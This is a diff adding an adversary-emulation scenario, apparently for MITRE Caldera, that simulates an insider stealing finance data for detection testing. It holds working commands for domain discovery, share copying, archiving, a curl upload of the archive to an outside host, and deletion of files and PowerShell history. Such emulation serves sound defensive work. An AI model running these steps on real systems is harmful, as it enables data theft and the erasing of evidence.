@@ -1,0 +1,80 @@
+# MITRE Caldera Operation — Insider Threat Scenario
+# Simulates a malicious insider with valid credentials
+
+name: "Insider Threat — Privileged User Data Theft"
+description: >
+  Simulates a disgruntled employee with valid domain credentials attempting
+  to exfiltrate sensitive data before leaving. Covers discovery, collection,
+  staging, and exfiltration with defense evasion.
+
+adversary:
+  name: insider-threat
+  objective: steal-intellectual-property
+
+operations:
+  - name: "Phase 1 — Reconnaissance (Legitimate-Looking)"
+    steps:
+
+      - name: "T1087.001 — Account Discovery"
+        tactic: discovery
+        technique: T1087.001
+        action: |
+          net user /domain
+          net group "Domain Admins" /domain
+
+      - name: "T1018 — Remote System Discovery"
+        tactic: discovery
+        technique: T1018
+        action: |
+          net view /domain
+          arp -a
+
+      - name: "T1083 — File and Directory Discovery"
+        tactic: discovery
+        technique: T1083
+        action: |
+          dir /s /b \\FILESERVER-01\Shares\Finance\
+          dir /s /b \\FILESERVER-01\Shares\HR\
+
+  - name: "Phase 2 — Unauthorized Access"
+    steps:
+
+      - name: "T1078 — Valid Account Abuse (off-hours)"
+        tactic: defense-evasion
+        technique: T1078
+        action: |
+          # Login at 2am — anomalous time (generates EventID 4624 off-hours)
+          echo "Simulated off-hours authentication"
+
+      - name: "T1039 — Network Share Data Collection"
+        tactic: collection
+        technique: T1039
+        action: |
+          robocopy \\FILESERVER-01\Shares\Finance C:\Users\%USERNAME%\AppData\Local\Temp\fin /s /xo
+
+  - name: "Phase 3 — Staging and Exfiltration"
+    steps:
+
+      - name: "T1074.001 — Local Data Staging"
+        tactic: collection
+        technique: T1074.001
+        action: |
+          7z a C:\Users\%USERNAME%\AppData\Local\Temp\archive.7z C:\Users\%USERNAME%\AppData\Local\Temp\fin\
+
+      - name: "T1048.003 — Exfil over HTTPS"
+        tactic: exfiltration
+        technique: T1048.003
+        action: |
+          # Upload to personal cloud (Zeek will see large HTTPS outbound)
+          curl -k -X PUT https://192.168.200.99/upload \
+            -H "Authorization: Bearer personal_token" \
+            --data-binary @C:\Users\%USERNAME%\AppData\Local\Temp\archive.7z
+
+      - name: "T1070 — Evidence Cleanup"
+        tactic: defense-evasion
+        technique: T1070
+        action: |
+          del /f /q C:\Users\%USERNAME%\AppData\Local\Temp\archive.7z
+          del /f /q /s C:\Users\%USERNAME%\AppData\Local\Temp\fin\
+          # Clear PowerShell history
+          Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
